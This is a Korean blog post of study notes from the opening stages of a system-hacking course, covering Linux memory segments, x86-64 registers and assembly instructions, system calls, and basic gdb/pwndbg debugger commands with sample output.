---
layout: post
title:  "System Hacking"
date: 2022-12-08 14:57 +0900
categories: study
---

# Stage 1 : System Hacking Instruction
## Welcome Hackers
본 커리큘럼은 C언어 또는 Python에 대한 기본 지식이 요구된다.

## Tool: Environment Setup
본 커리큘럼은 Ubuntu 18.04(x86-64)를 기반으로 진행된다.

가상 환경 구축 - 로컬에 가상 머신 설치 / 클라우드 기반 환경 이용하면 될 듯

# Stage 2 : Background - Coputer Science
## Linux Memory Layout
컴퓨터는 크게 CPU와 메모리로 이루어져 있으며, CPU가 실행할 명령어와 명령어 처리에 필요한 데이터를 메모리에서 읽고 ISA에 따라 처리한다. 그 후 결과를 메모리에 적재한다.
-> CPU의 동작과 메모리 사이에 밀접한 연관이 있다.
-> 악의적으로 메모리를 조작할 수 있다면 CPU 또한 잘못된 동작을 할 수 있다.

이러한 취약점들을 '메모리 오염(Memory Corruption)'이라고 한다.

### 세그먼트
적재되는 데이터의 용도별로 메모리의 구획을 나눈 것.
-> 각 용도에 맞게 권한을 부여할 수 있다는 장점이 있다.

### 코드 세그먼트(Code Segment, Text Segment)
실행 가능한 기계 코드가 위치하는 영역.
권한 : 읽기 및 실행

```C
int main() { return 31337; }
```

정수 31337을 반환하는 위의 main 함수가 컴파일 되면 '554889e5b8697a00005dc3'라는 기계 코드로 변환되어 코드 세그먼트에 위치하게 된다.

### 데이터 세그먼트(Data Segment)
컴파일 시점에 값이 정해진 전역 변수 및 전역 상수들이 위치하는 영역.
권한 : 읽기

data 세그먼트 : 쓰기 가능, 전역 변수와 같이 프로그램이 실행되면서 값이 변할 수 있는 값 저장
rodata(read-only data) 세그먼트 : 쓰기 불가능, 전역으로 선언된 상수 저장

```C
int data_num = 31337;
char data_rwstr[] = "writable_data";
const char data_rostr[] = "readonly_data";
char *str_ptr = "readonly";

int main() { ... }
```

위에서 str_ptr는 전역 변수로 data 세그먼트에 위치하지만, str_ptr가 가리키고 있는 "readonly"라는 문자열은 상수 문자열로 취급되어 rodata 세그먼트에 위치한다.

### BSS 세그먼트(BSS Segment)
컴파일 시점에 값이 정해지지 않은 전역 변수가 위치하는 영역.
권한 : 읽기 및 쓰기

BSS 세그먼트의 메모리 영역은 프로그램이 시작될 때 모두 0으로 초기화된다.

```C
int bss_data;

int main()
{
	printf("%d\n", bss_data);
	
	return 0;
}
```

위의 코드에서 초기화되지 않은 전역 변수인 bss_data가 BSS 세그먼트에 위치한다.

### 스택 세그먼트(Stack Segment)
프로세스의 스택이 위치하는 영역. 함수의 인자나 지역 변수와 같은 임시 변수들이 실행 중에 이곳에 저장됨.
권한 : 읽기 및 쓰기

스택 세그먼트는 __스택 프레임(Stack Frame)__이라는 단위로 사용된다. 스택 프레임은 함수가 호출될 때 생성되고 반환될 때 해제된다.

프로세스가 실행될 때 얼마 만큼의 스택 프레임을 사용하게 될 지를 미리 계산하는 것은 일반적으로 불가능하다. 따라서 운영체제는 작은 크기의 스택 세그먼트를 먼저 할당하고 필요할 때마다 이를 확장한다. 스택은 확장될 때 기존 주소보다 낮은 주소로 확장된다.

```C
void func()
{
	int choice = 0;
	
	scanf("%d", &choice);
	
	if (choice)
		call_true();
	else
		call_false();
	
	return 0;
}
```

위의 코드에서 지역 변수 choice가 스택 세그먼트에 위치한다.

### 힙 세그먼트(Heap Segment)
힙 데이터가 위치하는 영역. 스택 세그먼트와 같이 동적으로 할당되며, 리눅스에서는 스택 세그먼트와 반대 방향으로 저장됨.
권한 : 읽기 및 쓰기

```C
int main()
{
	int *heap_data_ptr = malloc(sizeof(*heap_data_ptr));
	*heap_data_ptr = 31337;
	
	printf("%d\n", *heap_data_ptr);
	
	return 0;
}
```

위의 코드에서 지역 변수 heap_data_ptr는 스택 세그먼트에 위치하고 malloc으로 할당받은 힙 세그먼트의 주소를 가리킨다.

|세그먼트|역할|일반적인 권한|사용 예|
|-|-|-|-|
 |코드 세그먼트|실행 가능한 코드가 저장된 영역|읽기, 실행|main() 등의 함수 코드|
 |데이터 세그먼트|초기화된 전역 변수 또는 상수가 위치하는 영역|읽기와 쓰기 또는 읽기 전용|초기화된 전역 변수, 전역 상수
 |BSS 세그먼트|초기화되지 않은 데이터가 위치하는 영역|읽기, 쓰기|초기화되지 않은 전역 변수|
 |스택 세그먼트|임시 변수가 저장되는 영역|읽기, 쓰기|지역 변수, 함수의 인자 등|
 |힙 세그먼트|실행중에 동적으로 사용되는 영역|읽기, 쓰기|malloc(), calloc() 등으로 할당 받은 메모리|

## Computer Architecture
컴퓨터 구조(Computer Architecture) : 서로 다른 부품들이 모여서 하나의 컴퓨터로 작동할 수 있도록하는 기본 설계
명령어 집합 구조(Instruction Set Architecture, ISA) : CPU가 사용하는 명령어와 관련된 설계

### 컴퓨터 구조(Computer Architecture)
컴퓨터가 효율적으로 작동할 수 있도록 하드웨어 및 소프트웨어의 기능을 고안하고 이들을 구성하는 방법을 말한다. 컴퓨터의 기능 구조에 대한 설계, 명령어 집합 구조, 마이크로 아키텍처와 기타 하드웨어 및 컴퓨팅 방법에 대한 설계 등이 포함된다.

컴퓨터의 기능 구조에 대한 설계 : 컴퓨터가 연산을 효율적으로 하기 위해 어떤 기능들이 컴퓨터에 필요한지 고민하고 설계하는 분야. ex) 폰 노이만 구조, 하버드 구조, 수정된 하버드 구조 등

명령어 집합 구조 : CPU가 처리해야 하는 명령어를 설계하는 분야. ex) ARM, MIPS, AVR, x86, x86-64 등

마이크로 아키텍처 : CPU의 하드웨어적 설계, 정의된 명령어 집합을 효율적으로 처리할 수 있도록 CPU의 회로를 설계하는 분야. ex) 캐시 설계, 파이프라이닝, 슈퍼 스칼라, 분기 예측, 비순차적 명령어 처리

하드웨어 및 컴퓨터 방법론 : ex) 직접 메모리 접근

### 폰 노이만 구조
초기 컴퓨터 과학자 폰 노이만은 컴퓨터에 연산, 제어, 저장의 세가지 핵심 기능이 필요하다고 생각
-> 근대의 컴퓨터는 연산과 제어에 중앙처리장치(Central Processing Unit, CPU), 저장에 기억장치(
memory), 장치 간 데이터나 제어 신호 교환에 버스(bus)를 사용한다.

##### 중앙처리장치
프로그램의 연산을 처리하고 시스템을 관리하는 컴퓨터의 두뇌.
산술/논리 연산을 처리하는 산술논리장치(Arithmetic Logic Unit, ALU)와 제어를 담당하는 제어장치(Control Unit), 데이터를 저장하는 레지스터(Resister) 등으로 구성된다.

##### 기억장치
컴퓨터가 동작하는데 필요한 여러 데이터를 저장. 용도에 따라 주기억장치와 보조기억장치로 분류된다.
주기억장치 : 프로그램 실행과정에서 필요한 데이터들을 임시로 저장하기 위해 사용. ex) 램(Random-Access Memory, RAM)
보조기억장치 : 운영 체제, 프로그램 등과 같은 데이터를 장기간 보관하기 위해 사용. ex) 하드 드라이브(Hard Disk Drive, HDD), SSD(Solid State Drive)

##### 버스
컴퓨터 부품과 부품 사이 또는 컴퓨터와 컴퓨터 사이에 신호를 전송하는 통로.
데이터가 이동하는 데이터 버스(Data Bus), 주소를 지정하는 주소 버스(Address Bus), 읽기/쓰기를 제어하는 제어 버스(Control Bus), 랜선, 프로토콜 등

> ##### 기억장치가 있음에도 레지스터가 필요한 이유
CPU는 굉장히 빠른 연산 속도를 가지고 있기 때문에 데이터를 빠르게 공급, 반출할 수 있어야 효율적으로 연산이 가능함
-> CPU의 연산 속도가 기억장치와의 데이터 교환 속도보다 압도적으로 빠르기 때문에 병목현상 발생
-> 교환 속도를 단축하기 위해 레지스터와 캐시를 사용

### 명령어 집합 구조(Instruction Set Architecture, ISA)
CPU가 해석하는 명령어의 집합.
다양한 컴퓨터 성능/컴퓨팅 환경이 존재하기 때문에 이에 따라 다양한 ISA가 존재.

### x86-64(x64) 아키텍처
인텔의 64비트 CPU 아키텍처. 인텔의 32비트 아키텍처인 IA-32를 64비트 환경에서 사용할 수 있도록 확장한 것.

##### n비트 아키텍처
n은 CPU가 한번에 처리할 수 있는 데이터의 크기. 컴퓨터 과학에서 ___WORD___라고 부른다.

> ##### WORD가 크면 유리한 점
32비트 아키텍처는 약 4기가 바이트의 가상메모리를 제공할 수 있지만, 64비트 아키텍처는 이론상 약 16엑사 바이트의 가상 메모리를 제공할 수 있음
-> 고사양의 소프트웨어를 실행하는 데에 유리함

#x86-64, #x64 

### x86-64(x64) 아키텍처 : 레지스터
CPU가 데이터를 빠르게 저장하고 사용할 때 이용. 산술 연산에 필요한 데이터를 저장하거나 주소를 저장하고 참조하는 등 다양한 용도로 사용.

#레지스터

##### 범용 레지스터(General Register)
주용도가 있으면서 다양한 용도로 활용될 수 있는 레지스터. 각각 8바이트를 저장할 수 있음.

|이름|용도|
|-|-|
|rax (accumulator register)|함수의 반환 값|
|rbx (base register)|x64에서는 주된 용도 없음|
|rcx (counter register)|반복문의 반복 횟수, 각종 연산의 시행 횟수|
|rdx (data register)|x64에서는 주된 용도 없음|
|rsi (source index)|데이터를 옮길 때 원본을 가리키는 포인터|
|rdi (destination index)|데이터를 옮길 때 목적지를 가리키는 포인터|
|rsp (stack pointer)|사용중인 스택의 위치를 가리키는 포인터|
|rbp (stack base pointer)|스택의 바닥을 가리키는 포인터|
|r8, r9, ..., r15| 추가 범용 레지스터|

##### 세그먼트 레지스터(Segment Register)
cs, ss, ds, es, fs, gs 총 6가지 세그먼트 레지스터가 존재. 각 레지스터의 크기는 16비트.
과거에는 사용 가능한 물리 메모리의 크기를 확장하기 위해 사용됨
-> x64에서는 사용 가능한 주소 영역이 굉장히 넓기 때문에 이런 용도로는 거의 사용되지 않음

cs, ds, ss 레지스터 : 코드 영역과 데이터, 스택 메모리 영역을 가리킬 때 사용됨
es, fs, gs 레지스터 : 운영체제 별로 용도를 결정할 수 있도록 범용적인 용도로 제작됨

##### 명령어 포인터 레지스터(Instruction Pointer Register, IP)
CPU가 어느 부분의 코드를 실행할지 가리킴. rip, 8바이트

##### 플래그 레지스터(Flag Register)
프로세서의 현재 상태를 저장. RFLAGS라고 불리는 64비트 크기의 플래그 레지스터가 존재하며, 과거 16비트 플래그 레지스터에서 확장됨. 자신을 구성하는 여러 비트들로 CPU의 현재 상태를 표현.

RFLAGS는 64비트이므로 최대 64개의 플래그를 사용할 수 있지만, 실제로는 20여개의 비트만 사용.

![](https://kr.object.ncloudstorage.com/dreamhack-content/page/b6e69e1a070c40486a8aedd8c1d93ca1f4cf009816c14dbbe9c25eff155ae2d9.png)

|플래그|의미|
|-|-|
|CF(Carry Flag)|부호 없는 수의 연산 결과가 비트의 범위를 넘을 경우 설정|
|ZF(Zero Flag)|연산의 결과가 0일 경우 설정|
|SF(Sign Flag)|연산의 결과가 음수일 경우 설정|
|OF(Overflow Flag)|부호 있는 수의 연산 결과가 비트 범위를 넘을 경우 설정|

> ##### 레지스터 호환
IA-32에서 CPU의 레지스터들은 32비트 크기를 가진다. 이들은 x64에서도 그대로 사용이 가능하며, 확장된 레지스터의 하위 32비트를 가리킨다.
eax, ebx, ecx, edx, esi, edi, esp, ebp

>위와 동일하게 IA-16에서 사용하던 16비트 아키텍처인 ax, bx, cx, dx, si, di, sp, bp는 32비트 레지스터의 하위 16비트를 가리킨다.

## x86 Assembly
David Wheeler가 EDSAC을 개발하면서 어셈블리 언어(Assembly Language)와 어셈블러(Assembler)를 고안

### 어셈블리 언어
컴퓨터의 기계어와 치환되는 언어. ISA에 따라 사용하는 어셈블리 언어가 다름.

### x64 어셈블리 언어
x64 어셈블리 언어의 문장을 명령어(Operation Code, Opcode)와 피연산자(Operand)로 구성됨.


_x64 어셈블리 명령어_

|명령 코드| |
|-|-|
|데이터 이동(Data Transfer)|`mov`, `lea`|
|산술 연산(Arithmetic)|`inc`, `dec`, `add`, `sub`|
|논리 연산(Logical)|`and`, `or`, `xor`, `not`|
|비교(Comparison)|`cmp`, `test`|
|분기(Branch)|`jmp`, `je`, `jg`|
|스택(Stack)|`push`, `pop`|
|프로시져(Procedure)|`call`, `ret`, `leave`|
|시스템 콜(System call)|`syscall`|

### 피연산자
- 상수(Immediate Value)
- 레지스터(Register)
- 메모리(Memory)

메모리 피연산자는 [ ]으로 둘러싸인 것으로 표현되며, 앞에 크기 지정자(Size Directive) TYPE PTR이 추가될 수 있음. 타입에는 BYTE, WORD, DWORD, QWORD가 올 수 있으며, 각각 1바이트, 2바이트, 4바이트, 8바이트의 크기를 지정.

_메모리 피연산자의 예_

|메모리 피연산자| |
|-|-|
|QWORD PTR [0x8048000]|0x8048000의 데이터를 8바이트만큼 참조|
|DWORD PTR [0x8048000]|0x8048000의 데이터를 4바이트만큼 참조|
|WORD PTR [rax]|rax가 가르키는 주소에서 데이터를 2바이트 만큼 참조|

### 데이터 이동 명령어
어떤 값을 레지스터나 메모리에 옮기도록 지시

_mov dst, src : src에 들어있는 값을 dst에 대입_

|mov| |
|-|-|
|mov rdi, rsi|rsi의 값을 rdi에 대입|
|mov QWORD PTR[rdi], rsi|rsi의 값을 rdi가 가리키는 주소에 대입|
|mov QWORD PTR[rdi+8\*rcx], rsi|rsi의 값을 rdi+8*rcx가 가리키는 주소에 대입|

_lea dst, src : src의 유효 주소(Effective Address, EA)를 dst에 저장_

|lea| |
|-|-|
|lea rsi, [rbx+8\*rcx]|rbx+8*rcx 를 rsi에 대입|

### 산술 연산 명령어
덧셈, 뺄셈, 곱셈, 나눗셈 연산을 지시

_add dst, src : dst에 src의 값을 더함_

| add                   |                      |
| --------------------- | -------------------- |
| add eax, 3            | eax += 3             |
| add ax, WORD PTR[rdi] | ax += \*(WORD \*)rdi |

_sub dst, src: dst에서 src의 값을 뺌_

|sub| |
|-|-|
|sub eax, 3|eax -= 3|
|sub ax, WORD PTR[rdi]|ax -= \*(WORD \*)rdi|

_inc op: op의 값을 1 증가시킴_

|inc| |
|-|-|
|inc eax|eax += 1|

_dec op: op의 값을 1 감소 시킴_

|dec| |
|-|-|
|dec eax|eax -= 1|

### 논리 연산 명령어
and, or, xor, neg 등의 비트 연산을 지시

_and dst, src: dst와 src의 비트가 모두 1이면 1, 아니면 0_
```
[Register]
ax = 0xffff0000
ebx = 0xcafebabe

[Code]
and eax, ebx

[Result]
eax = 0xcafe0000
```

_or dst, src: dst와 src의 비트 중 하나라도 1이면 1, 아니면 0_
```
[Register]
eax = 0xffff0000
ebx = 0xcafebabe

[Code]
or eax, ebx

[Result]
eax = 0xffffbabe
```

_xor dst, src: dst와 src의 비트가 서로 다르면 1, 같으면 0_
```
[Register]
eax = 0xffffffff
ebx = 0xcafebabe

[Code]
xor eax, ebx

[Result]
eax = 0x35014541
```

_not op: op의 비트 전부 반전_
```
[Register]
eax = 0xffffffff

[Code]
not eax

[Result]
eax = 0x00000000
```

### 비교 명령어
두 피연산자의 값 비교, 플래그 설정

_cmp op1, op2: op1과 op2를 비교_
두 피연산자를 빼서 대소 비교.
```
[Code]
1: mov rax, 0xA
2: mov rbx, 0xA
3: cmp rax, rbx ; ZF=1
```

_test op1, op2: op1과 op2를 비교_
두 피연산자에 AND 비트 연산을 취함.
```
[Code]
1: xor rax, rax
2: test rax, rax ; ZF=1
```

### 분기 명령어
`rip`를 이동시켜 실행 흐름을 바꿈

_jmp addr: addr로 rip를 이동_
```
[Code]
1: xor rax, rax
2: jmp 1 ; jump to 1
```

_je addr: 직전에 비교한 두 피연산자가 같으면 점프 (jump if equal)_
```
[Code]
1: mov rax, 0xcafebabe
2: mov rbx, 0xcafebabe
3: cmp rax, rbx ; rax == rbx
4: je 1 ; jump to 1
```

_jg addr: 직전에 비교한 두 연산자 중 전자가 더 크면 점프 (jump if greater)_
```
[Code]
1: mov rax, 0x31337
2: mov rbx, 0x13337
3: cmp rax, rbx ; rax > rbx
4: jg 1  ; jump to 1
```

### Opcode : 스택
스택을 조작하는 명령어

_push val : val을 스택 최상단에 쌓음_

__연산__
rsp -= 8  
[rsp] = val

__예제__
```
[Register]
rsp = 0x7fffffffc400

[Stack]
0x7fffffffc400 | 0x0  <= rsp
0x7fffffffc408 | 0x0

[Code]push 0x31337
```

__결과__
```
[Register]
rsp = 0x7fffffffc3f8

[Stack]
0x7fffffffc3f8 | 0x31337 <= rsp
0x7fffffffc400 | 0x0
0x7fffffffc408 | 0x0
```

_pop reg : 스택 최상단의 값을 꺼내서 reg에 대입_

__연산__
rsp += 8  
reg = [rsp-8]

__예제__
```
[Register]
rax = 0
rsp = 0x7fffffffc3f8

[Stack]
0x7fffffffc3f8 | 0x31337 <= rsp
0x7fffffffc400 | 0x0
0x7fffffffc408 | 0x0

[Code]
pop rax
```

__결과__
```
[Register]
rax = 0x31337
rsp = 0x7fffffffc400

[Stack]
0x7fffffffc400 | 0x0 <= rsp
0x7fffffffc408 | 0x0
```

### Opcode : 프로시저
프로시저 : 특정 기능을 수행하는 코드 조각

호출(Call) : 프로시저를 부르는 행위
반환(Return) : 프로시저에서 돌아오는 것
프로시저를 호출할 때는 프로시저를 실행하고 나서 원래의 실행 흐름으로 돌아와야 하므로, call 다음의 명령어 주소(return address, 반환 주소)를 스택에 저장하고 프로시저로 rip를 이동시킴

_call addr : addr에 위치한 프로시져 호출_

__연산__
push return_address  
jmp addr

__예제__
```
[Register]
rip = 0x400000
rsp = 0x7fffffffc400

[Stack]
0x7fffffffc3f8 | 0x0
0x7fffffffc400 | 0x0 <= rsp

[Code]
0x400000 | call
0x401000  <= rip
0x400005 | mov esi, eax
...
0x401000 | push rbp
```

__결과__
```
[Register]
rip = 0x401000
rsp = 0x7fffffffc3f8

[Stack]
0x7fffffffc3f8 | 0x400005  <= rsp
0x7fffffffc400 | 0x0

[Code]
0x400000 | call
0x4010000x400005 | mov esi, eax
...
0x401000 | push rbp  <= rip
```

_leave: 스택프레임 정리_

__연산__
mov rsp, rbp  
pop rbp

__예제__
```
[Register]
rsp = 0x7fffffffc400
rbp = 0x7fffffffc480

[Stack]
0x7fffffffc400 | 0x0 <= rsp
...
0x7fffffffc480 | 0x7fffffffc500 <= rbp
0x7fffffffc488 | 0x31337

[Code]
leave
```

__결과__
```
[Register]
rsp = 0x7fffffffc488
rbp = 0x7fffffffc500

[Stack]
0x7fffffffc400 | 0x0
...
0x7fffffffc480 | 0x7fffffffc500
0x7fffffffc488 | 0x31337 <= rsp
...
0x7fffffffc500 | 0x7fffffffc550 <= rbp
```

_ret : return address로 반환_

__연산__
pop rip

__예제__
```
[Register]
rip = 0x401000
rsp = 0x7fffffffc3f8

[Stack]
0x7fffffffc3f8 | 0x400005    <= rsp

[Code]
0x400000 | call
0x401000
0x400005 | mov esi, eax
...
0x401000 | mov rbp, rsp
...
0x401007 | leave
0x401008 | ret <= rip
```

__결과__
```
[Register]
rip = 0x400005
rsp = 0x7fffffffc400

[Stack]
0x7fffffffc3f8 | 0x400005
0x7fffffffc400 | 0x0    <= rsp

[Code]
0x400000 | call
0x401000
0x400005 | mov esi, eax   <= rip
...
0x401000 | mov rbp, rsp
...
0x401007 | leave
0x401008 | ret
```

_스택프레임이란?_

스택은 함수별로 자신의 지역변수 또는 연산과정에서 부차적으로 생겨나는 임시 값들을 저장하는 영역이다. 만약 이 스택 영역을 아무런 구분 없이 사용하게 된다면, 서로 다른 두 함수가 같은 메모리 영역을 사용할 수 있게 된다.

예를 들어 A라는 함수가 B라는 함수를 호출하는데, 이 둘이 같은 스택 영역을 사용한다면, B에서 A의 지역변수를 모두 오염시킬 수 있다. 이 경우, B에서 반환한 뒤 A는 정상적인 연산을 수행할 수 없다.

따라서 함수별로 서로가 사용하는 스택의 영역을 명확히 구분하기 위해 스택프레임이 사용된다. 우분투 18.04에서 함수는 호출될 때 자신의 스택프레임을 만들고, 반환할 때 이를 정리한다.

#스택, #스택프레임

![](https://kr.object.ncloudstorage.com/dreamhack-content/page/22dad39e510cf772b5909d46b1166519f441ea616127c4c6f818701171493b62.png)

### Opcode : 시스템 콜
윈도우, 리눅스, 맥 등의 현대 운영체제는 컴퓨터 자원의 효율적인 사용을 위해, 그리고 사용자에게 편리한 경험을 제공하기 위해, 내부적으로 매우 복잡한 동작을 한다. 운영체제는 연결된 모든 하드웨어 및 소프트웨어에 접근할 수 있으며, 이들을 제어할 수도 있다. 그리고 해킹으로부터 이 막강한 권한을 보호하기 위해 커널 모드와 유저 모드로 권한을 나눈다.

##### 커널 모드
운영체제가 전체 시스템을 제어하기 위해 시스템 소프트웨어에 부여하는 권한. 파일시스템, 입력/출력, 네트워크 통신, 메모리 관리 등 모든 저수준의 작업은 커널 모드에서 진행. 커널 모드에서는 시스템의 모든 부분을 제어할 수 있기 때문에, 해커가 커널 모드까지 진입하게 되면 시스템은 거의 무방비 상태가 됨.

##### 유저 모드
운영체제가 사용자에게 부여하는 권한. 유저 모드에서는 해킹이 발생해도, 해커가 유저 모드의 권한까지 밖에 획득하지 못하기 때문에 해커로 부터 커널의 막강한 권한을 보호할 수 있음.

##### 시스템 콜(system call, syscall)
유저 모드에서 커널 모드의 시스템 소프트웨어에게 어떤 동작을 요청하기 위해 사용.
소프트웨어 대부분은 커널의 도움이 필요함
-> 도움이 필요하다는 요청을 시스템 콜이라고 함.
유저 모드의 소프트웨어가 필요한 도움을 요청하면, 커널이 요청한 동작을 수행하여 유저에게 결과를 반환.

x64아키텍처에서는 시스템콜을 위해 `syscall` 명령어가 있음.

시스템 콜은 함수로, 필요한 기능과 인자에 대한 정보를 레지스터로 전달하면, 커널이 이를 읽어서 요청을 처리함.

_syscall_ ^4ea457

__요청__
rax

__인자 순서__
rdi → rsi → rdx → rcx → r8 → r9 → stack

__예제__
```
[Register]
rax = 0x1
rdi = 0x1
rsi = 0x401000
rdx = 0xb

[Memory]
0x401000 | "Hello Wo"
0x401008 | "rld"

[Code]
syscall 
```

__결과__
```
Hello World
```

__해석__
rax가 0x1일 때, 커널에 write 시스템콜을 요청 
-> rdi, rsi, rdx가 0x1, 0x401000, 0xb 이므로 커널은 write(0x1, 0x401000, 0xb)를 수행

write함수의 각 인자는 출력 스트림, 출력 버퍼, 출력 길이를 나타냄. 0x1은 stdout이며, 이는 일반적으로 화면을 의미. 0x401000에는 Hello World가 저장되어 있고 길이는 0xb로 지정되어 있으므로 화면에 Hello World가 출력.

### x64 syscall 테이블

|syscall|rax|arg0 (rdi)|arg1 (rsi)|arg2 (rdx)|
|-|-|-|-|-|
|read|0x00|unsigned int fd|char \*buf|size_t count|
|write|0x01|unsigned int fd|const char \*buf|size_t count|
|open|0x02|const char \*filename|int flags|umode_t mode|
|close|0x03|unsigned int fd| | |
|mprotect|0x0a|unsigned long start|size_t len|unsigned long prot|
|connect|0x2a|int sockfd|struct sockaddr \* addr|int addrlen|
|execve|0x3b|const char *filename|const char \*const \*argv|const char \*const \*envp|


Welcome to assembly world!
r34dy 70 d3bu6?

# Stage 3 : Tool Installation
## gdb 설치
### 버그
컴퓨터 과학에서 실수로 발생한 프로그램의 결함을 뜻함.

### 디버거
완성된 코드에서 버그를 없애기 위해 사용하는 프로그램. 디버거를 사용하면 개발자는 버그를 고치기 쉬워지고, 해커들은 취약점을 찾기 쉬워진다.

### gdb(GNU debugger)
리눅스의 대표적인 디버거. 오픈 소스 프로그램이며, 다양한 플러그인이 존재함.

### pwndbg
gdb의 플러그인으로 여러 편리한 기능을 가지고 있음.

https://github.com/pwndbg/pwndbg

```C
// debugee.c

#include <stdio.h>

int main(void)
{
	int sum = 0;
	int val1 = 1;
	int val2 = 2;
	
	sum = val1 + val2;
	
	printf("1 + 2 = %d\\n", sum);
	
	return 0;
}
```

위의 코드를 컴파일 하여 gdb를 실행한다.

##### start
리눅스는 실행파일의 형식으로 ELF(Executable and Linkable Format)를 규정하고 있다. ELF는 크게 헤더와 섹션으로 이루어져 있으며, 헤더에는 실행에 필요한 여러 정보가 저장되어 있고 섹션에는 여러 데이터가 저장된다. 운영체제는 ELF의 헤더에 있는 진입점(Entry Point, EP)이라는 필드의 값부터 프로그램을 실행한다.

`start` 명령어로 진입점부터 프로그램을 분석할 수 있다.

![[1.png]]

##### context
프로그램은 실행되면서 여러 메모리에 접근한다. pwndbg는 주요 메모리들의 상태를 프로그램이 실행되고 있는 Context라고 부르며, 이를 가독성 있게 표현할 수 있는 인터페이스를 갖추고 있다.

registers : 레지스터의 상태를 보여줌
disasm : rip부터 여러 줄에 걸쳐 디스어셈블된 결과를 보여줌
stack : rsp부터 여러 줄에 걸쳐 스택의 값을 보여줌
backtrace : 현재 rip에 도달할 때까지 어떤 함수들이 중첩되어 호출됐는지 보여줌

Context는 어셈블리를 실행할 때마다 갱신되어 방금 실행한 어셈블리 명령어가 메모리에 어떤 영향을 줬는지 쉽게 파악할 수 있게 돕는다.
##### break

특정 주소에 중단점(breakpoint)을 설정한다.

##### continue
중단된 프로그램을 계속 실행한다.

##### run
중단점이 없다면 프로그램을 끝까지 자동으로 실행한다. 중단점이 있다면 중단점에서 멈춘다.


##### disassembly
gdb는 기본적으로 기계어를 디스어셈블하는 기능을 가지고 있다. disassemble에 함수 이름을 인자로 전달하면 해당 함수가 반활될 때까지 디스어셈블한 결과를 출력한다.

##### nevigate
명령어를 한 줄씩 실행하면 분석할 때 사용한다.

ni(next instruction) : 서브루틴을 호출하는 경우 서브루틴의 내부로 들어가지 않는다.
si(step into) : 서브루틴을 호출하는 경우 서브루틴의 내부로 들어간다.

> ##### printf를 실행하여도 문자열이 출력되지 않는 이유
> printf로 출력하는 문자열은 stdout 버퍼에서 대기한다. stdout 버퍼가 데이터를 목적지로 이동시키는 조건은 다음과 같다.
>
> 1. 프로그램이 1.  종료될 때
> 2.  버퍼가 가득 찼을 때
> 3.  fflush와 같은 함수로 버퍼를 비우도록 명시했을 때
> 4.  개행문자가 버퍼에 들어왔을 때

##### finish
si로 서브루틴의 내부로 들어갔을 때 ni로는 원래의 실행 흐름으로 돌아가기 힘들만큼 서브루틴의 규모가 큰 경우 finish 명령어를 통해 한 번에 서브루틴의 끝까지 실행할 수 있다.

##### examine
가상 메모리에 존재하는 임의 주소의 값을 관찰할 때 사용한다.
x를 이용하면 특정 주소에서 원하는 길이만큼의 데이터를 원하는 형식으로 인코딩하여 볼 수 있다.

	Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal), t(binary), f(float), a(address), i(instruction), c(char), s(string) and z(hex, zero padded on the left). Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).


ex)
1. rsp부터 80바이트를 8바이트씩 hex형식으로 출력

```
pwndbg> x/10gx $rsp
0x7fffffffe3e8:	0x00007ffff7a03c87	0x0000000000000001
0x7fffffffe3f8:	0x00007fffffffe4c8	0x0000000100008000
0x7fffffffe408:	0x00000000004004e7	0x0000000000000000
0x7fffffffe418:	0xf4f7bf91227971c1	0x0000000000400400
0x7fffffffe428:	0x00007fffffffe4c0	0x0000000000000000
```

2. rip부터 5줄의 어셈블리 명령어 출력

```
pwndbg> x/5i $rip
=> 0x4004e7 <main>:	push   rbp
   0x4004e8 <main+1>:	mov    rbp,rsp
   0x4004eb <main+4>:	sub    rsp,0x10
   0x4004ef <main+8>:	mov    DWORD PTR [rbp-0xc],0x0
   0x4004f6 <main+15>:	mov    DWORD PTR [rbp-0x8],0x1
```

3. 특정 주소의 문자열 출력

```
pwndbg> x/s 0x400000
0x400000:	"\177ELF\002\001\001"
```

##### telescope
pwndbg에서 제공하는 기능으로, 메모리가 참조하고 있는 주소를 재귀적으로 탐색하여 값을 보여준다.

```
pwndbg> tele
00:0000│ rsp 0x7fffffffe3e8 —▸ 0x7ffff7a03c87 (__libc_start_main+231) ◂— mov    edi, eax
01:0008│     0x7fffffffe3f0 ◂— 0x1
02:0010│     0x7fffffffe3f8 —▸ 0x7fffffffe4c8 —▸ 0x7fffffffe713 ◂— '/home/ubuntu/Documents/debugee'
03:0018│     0x7fffffffe400 ◂— 0x100008000
04:0020│     0x7fffffffe408 —▸ 0x4004e7 (main) ◂— push   rbp
05:0028│     0x7fffffffe410 ◂— 0x0
06:0030│     0x7fffffffe418 ◂— 0xf4f7bf91227971c1
07:0038│     0x7fffffffe420 —▸ 0x400400 (_start) ◂— xor    ebp, ebp
```

##### vmmap
가상 메모리의 레이아웃을 보여준다. 어떤 파일이 맵핑된 영역일 경우 해당 파일의 경로까지 보여준다.

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /home/ubuntu/Documents/debugee
          0x600000           0x601000 r--p     1000 0      /home/ubuntu/Documents/debugee
          0x601000           0x602000 rw-p     1000 1000   /home/ubuntu/Documents/debugee
    0x7ffff79e2000     0x7ffff7bc9000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7bc9000     0x7ffff7dc9000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dc9000     0x7ffff7dcd000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dcd000     0x7ffff7dcf000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dcf000     0x7ffff7dd3000 rw-p     4000 0      [anon_7ffff7dcf]
    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7fed000     0x7ffff7fef000 rw-p     2000 0      [anon_7ffff7fed]
    0x7ffff7ff8000     0x7ffff7ffb000 r--p     3000 0      [vvar]
    0x7ffff7ffb000     0x7ffff7ffc000 r-xp     1000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 29000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 2a000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
